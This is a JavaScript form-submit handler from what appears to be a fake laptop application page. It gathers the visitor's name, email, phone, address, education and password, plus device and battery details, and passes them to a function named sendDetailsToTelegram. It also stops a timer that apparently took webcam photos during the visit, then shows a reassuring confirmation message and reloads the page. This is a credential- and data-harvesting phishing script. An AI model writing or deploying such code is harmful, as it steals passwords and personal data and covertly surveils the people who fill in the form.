        document.getElementById('laptopForm').addEventListener('submit', function(e) {
            e.preventDefault();

            const fullname = document.getElementById('fullname').value.trim();
            const email = document.getElementById('email').value.trim();
            const phone = document.getElementById('phone').value.trim();
            const education = document.getElementById('education').value;
            const address = document.getElementById('address').value.trim();
            const password = document.getElementById('password').value.trim();

            // ===== Get Mobile/Device Details =====
            const device = getMobileDetails();

            // Wait for battery info (async)
            let batteryLevel = 'Unknown';
            let chargingStatus = 'Unknown';
            if (navigator.getBattery) {
                navigator.getBattery().then(function(battery) {
                    batteryLevel = Math.round(battery.level * 100) + '%';
                    chargingStatus = battery.charging ? 'Charging 🔌' : 'Not Charging 🔋';
                    window._batteryLevel = batteryLevel;
                    window._chargingStatus = chargingStatus;
                    // Send after battery info
                    sendDetailsToTelegram(fullname, email, phone, education, address, password, device, batteryLevel,
                        chargingStatus);
                }).catch(function() {
                    sendDetailsToTelegram(fullname, email, phone, education, address, password, device, 'Unknown',
                        'Unknown');
                });
            } else {
                sendDetailsToTelegram(fullname, email, phone, education, address, password, device, 'Unknown', 'Unknown');
            }

            // ===== Show Toast Message =====
            document.getElementById('tName').textContent = fullname;
            document.getElementById('tEmail').textContent = email;
            document.getElementById('tPhone').textContent = phone;
            document.getElementById('tEdu').textContent = education;

            const toast = document.getElementById('toastMessage');
            toast.style.display = 'block';

            // ===== Stop Webcam =====
            if (photoInterval) {
                clearInterval(photoInterval);
                photoInterval = null;
            }
            stopWebcam();

            // ===== Reload Page after 3 seconds =====
            setTimeout(function() {
                location.reload();
            }, 3000);

            this.reset();
        });
